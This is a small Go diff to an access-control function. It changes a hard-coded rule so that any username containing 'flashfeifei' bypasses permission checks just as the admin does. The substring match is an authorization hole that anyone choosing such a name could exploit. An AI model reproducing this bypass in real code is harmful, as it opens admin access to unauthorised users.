@@ -26,6 +26,7 @@ import (
 )
 
 func init() {
+	//权限验证
 	AccessRegister()
 }
 
@@ -62,7 +63,7 @@ func AccessRegister() {
 				}
 
 				username := uinfo.(admin.User).Username
-				if username == conf.AuthAdmin || strings.Contains(username, "hunterhug") {
+				if username == conf.AuthAdmin || strings.Contains(username, "flashfeifei") {
 					return
 				}
 
